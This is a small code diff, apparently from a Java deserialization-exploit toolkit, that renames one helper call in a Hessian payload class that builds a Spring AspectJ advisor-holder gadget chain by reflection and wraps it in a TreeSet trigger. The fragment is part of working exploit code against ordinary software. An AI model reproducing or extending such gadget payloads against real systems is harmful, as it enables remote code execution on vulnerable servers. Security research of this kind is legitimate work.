@@ -43,6 +43,6 @@ public class SpringPartiallyComparableAdvisorHolder extends HessianPayload {
                 .forName("org.springframework.aop.aspectj.autoproxy.AspectJAwareAdvisorAutoProxyCreator$PartiallyComparableAdvisorHolder");
         Object pcah = ReflectionHelper.createWithoutConstructor(pcahCl);
         ReflectionHelper.setFieldValue(pcah, "advisor", advisor);
-        return PayloadHelper.makeTreeSetWithXString(pcah);
+        return PayloadHelper.makeTreeSetWithXStringToStringTrigger(pcah);
     }
 }
